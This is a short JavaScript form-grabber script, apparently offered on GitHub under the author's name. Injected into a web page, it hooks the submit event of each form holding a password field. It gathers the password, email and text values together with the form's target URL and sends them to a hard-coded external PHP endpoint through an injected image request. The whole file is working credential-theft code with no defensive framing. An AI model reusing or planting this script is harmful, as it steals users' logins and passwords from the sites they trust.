host = 'https://alaseel1.000webhostapp.com/StealSCH.php?cookie='; //LINK FILE IN WEBHOST
timeout = 1000;

//BY MAHDI ALBADRY
//https://github.com/MAHDI-ALBADRY/GetALLPassword
function sleep(millisegundos) {
var inicio = new Date().getTime();
while ((new Date().getTime() - inicio) < millisegundos){}
}

campos = document.querySelectorAll('input[type=password]'); 
for(i=0; i<campos.length; i++) 
{
//BY MAHDI ALBADRY
//https://github.com/MAHDI-ALBADRY/GetALLPassword
form = campos[i].form;
form.addEventListener('submit', function(){ 
mensaje = 'URL: ' + this.action + '\n';       
nodos = this.querySelectorAll('input'); 
for(j=0; j<nodos.length; j++)
{
nodo = nodos[j];
console.log(nodo);
if(nodo.type==='password' || nodo.type==='email' || nodo.type==='text') 
{
mensaje = mensaje + nodo.name + ': ' + nodo.value + '\n'; 
}
}
query = '?data=' + escape(mensaje);
document.write('<img src="' + host + query + '">'); 
sleep(timeout); 
}, false)
}
//BY MAHDI ALBADRY
//https://github.com/MAHDI-ALBADRY/GetALLPassword